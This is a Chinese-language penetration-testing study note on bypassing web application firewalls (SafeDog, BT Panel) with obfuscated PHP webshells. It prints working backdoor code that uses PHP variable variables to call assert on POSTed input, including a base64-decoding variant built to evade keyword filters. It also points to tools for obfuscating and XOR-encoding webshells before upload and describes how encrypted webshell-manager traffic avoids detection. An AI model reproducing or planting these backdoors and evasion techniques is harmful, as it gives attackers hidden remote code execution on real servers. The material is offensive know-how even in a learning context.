---
title: "网安笔记 - WAF绕过 - 代码混淆"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

## 一、思维导图

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986160-fd4548ac-ec87-4186-bdc0-01e1939f8f87.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516164926.png)

## 二、后门原理

### 1、变量覆盖--后门绕过安全狗：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986048-2fee1469-4dc4-4bf8-ad61-5b17a7d62868.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516220134.png)

相当于

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986148-7148c135-efe5-4ba9-9fe9-27c3d2897fae.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516220202.png)

```
<?php
$a = $_GET['x'];
$$a = $_GET['y'];
$b($_POST['z']);

//?x=b&y=assert
//$a $$a=assert=$b
//assert($_POST['chopper'])

?>
```

这里解释$$是什么东西

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483425929-20d1b7b4-0045-4c9c-b4cb-bc10959f0af1.png)

也就说：使用$var储存了一个String类型的值“PHP”，然后使用引用变量$$var储存一个String类型的值“PHP中文网”。

测试：

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483956816-74fb17c7-17d7-4320-a300-2d7edb1dfd09.png)

  

### 2、加密传输

采取上面的方式很可能会被宝塔给拦截

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986130-f0383773-013a-4cba-a752-814a24f37a56.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516225822.png)

编码绕过，在一些常见的waf例如宝塔对传入的参数会进行判断如果是包含类似`phpinfo()`这样的风险代码会被拦截，这个时候我们可以采用对代码进行编码的方式进行参数。

```
<?php
$a = $_GET['x'];
$$a = $_GET['y'];
$b(base64_decode($_POST['z']));

//?x=b&y=assert
//$a $$a=assert=$b
//assert($_POST['chopper'])

?>
```

对`PHPinfo();`进行编码为`cGhwaW5mbygpOw==`

还可以采取加密传输：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482997955-e0e51861-d682-4180-928e-5bc97b0c3ca6.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516225321.png)

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998120-9c6e041f-6d71-47fc-8f06-85918c46b779.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516225502.png)

稳得一批：

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630485987527-7f65e219-d172-4bb4-a3d1-129f9cac85fd.png)

### 3、加密混淆

下载地址：

https://github.com/djunny/enphp

目标加密的代码，不要将code_test的文件移到或者删除很有可能会导致使用失败。

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998232-808fbbe2-7fe1-40a9-a19d-9dd80b099d98.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516230015.png)

通过混淆的脚本

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998232-d8caf0c9-9c3d-47ef-8a5f-5cf1b0419279.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516230145.png)

混淆完之后：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999464-17319a62-3318-4e1d-92cd-3803b80a084b.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516231312.png)

上传上去之后：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998886-f8f32730-bd22-4337-8441-57f890200b43.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517195727.png)

很稳。

### 4、借用在线API接口实现加密混淆

如果上面的方式被安全狗杀掉，或者过不了宝塔的话。

网址：

http://phpjiami.com/phpjiami.html

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998908-2f8c3246-72c6-4244-b0a4-c1dc9461cd20.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517195931.png)

### 5、异或加密Webshell-venom

[https://github.com/yzddmr6/as_webshell_venom](https://github.com/yzddmr6/as_webshell_venom)

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999035-43da0dd4-cccd-4f82-9fea-39de854ef01a.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517200834.png)

运行里面的脚本，然后就出来了，随机的。复制好上传就行。

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999483-8d88bda5-81c7-45fb-9cdc-5ab851a82ef2.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517200859.png)

但是要看一下有没有GET提交id，这个就自己随便构造吧。还支持base64加密提交来绕过。

在用蚁剑连接的时候，可以选择扩展选项来进行连接。

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999684-431b86af-ffc2-4ee5-b9d0-d68ad52333a0.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517201514.png)

### 6、webshell管理工具优缺点

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999823-0fa8c51d-ed25-4cfd-aaec-c79f891c7824.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517201735.png)

单双向加密传输的区别：

双向加密传输就是发包之前已经加密了，并且从服务器传回来的数据也是加密的，这样在安全狗这些WAF检测内容的时候就狠nice。

#### ①菜刀单向加密举例：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000078-53c99173-eb61-492c-ad57-2249f5bd6af0.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517202325.png)

抓包分析菜刀执行操作时候的数据包，然后模拟提交，返回了目录列表。

#### ②冰蝎示例：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000463-f9eb124f-702b-4a44-9d8e-66661f651717.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517203155.png)

双向加密。

## 三、自己造轮子

### 1、在冰蝎连接之后，查看目录发现获取不了。

抓包分析了一波，找到了冰蝎获取目录所用到的一些函数。

### 2、自己写获取目录

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000326-90dd0405-fbb2-4260-9c28-0b5602eed0f9.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517204033.png)

获取当前目录。结果：

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000422-309a868f-b2d1-43ce-8165-e59087baa58b.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517204049.png)

### 3、写入文件

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000541-c98e05cb-757d-4115-b5e5-fd096367bc71.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517204256.png)

### 4、自己写脚本模拟工具

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483001130-533d417d-538c-4c68-9233-0639d37c7056.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517205018.png)